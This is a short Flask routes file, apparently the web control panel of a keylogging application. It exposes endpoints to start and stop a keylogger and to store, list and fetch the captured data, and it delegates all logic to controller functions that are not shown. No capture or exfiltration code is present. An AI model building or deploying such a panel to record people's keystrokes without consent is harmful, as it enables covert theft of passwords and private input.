from flask import Blueprint, request
from controllers import *

# Creating a Blueprint for the management of the routers
app_routes = Blueprint("app_routes", __name__)





@app_routes.route("/start_keylogger", methods=["POST"])
def start_keylogger():
    return start_listening()

@app_routes.route("/stop_keylogger", methods=["POST"])
def stop_keylogger():
    return stop_listening()
@app_routes.route("/storage", methods=["POST"])
def stores_data():
       return store_data()


@app_routes.route("/")
def index():
    return index_page()







@app_routes.route("/users", methods=["GET", "POST"])
def users():
   return get_users()




@app_routes.route("/get_data", methods=["GET"])
def get():
     return get_data()

@app_routes.route("/handle_url_params")
def handle_url():
    return handle_url_params()
